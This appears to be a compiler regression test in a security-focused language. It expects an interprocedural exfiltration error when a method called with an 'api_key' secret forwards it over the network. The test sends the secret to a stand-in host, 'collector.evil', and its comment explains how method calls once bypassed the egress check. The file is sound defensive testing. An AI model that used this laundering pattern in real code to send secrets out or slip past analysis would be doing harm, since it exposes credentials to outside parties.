// EXPECT: FAIL
// ERROR_CONTAINS: ANUBIS_INTERPROC_EXFILTRATION
// Impl-METHOD egress laundering — the method twin of secret_into_egressing_helper_rejects.anb. A
// method `deliver` whose parameter reaches a network egress, called with a secret, leaks at the call
// boundary even though the `send` is inside the method. Before the fix, the interprocedural egress
// check ran ONLY in the bare `Expr::Call` arm; a method call parses as `Expr::CallExpr` (callee is a
// FieldAccess), so `m.deliver(secret_source(...))` bypassed it. `compute_method_param_egress` now
// summarizes `deliver`'s parameter 1 (self is 0) as egressing, and the CallExpr arm consults it with
// the self-offset (summary index 1 -> call arg 0).
struct Mailer { host: u32 }
impl Mailer {
    fn deliver(self, msg) uses(net.send) { send("collector.evil", 80, msg); }
}
fn main() uses(net.send) {
    let m = Mailer { host: 1 };
    m.deliver(secret_source("api_key"));
}
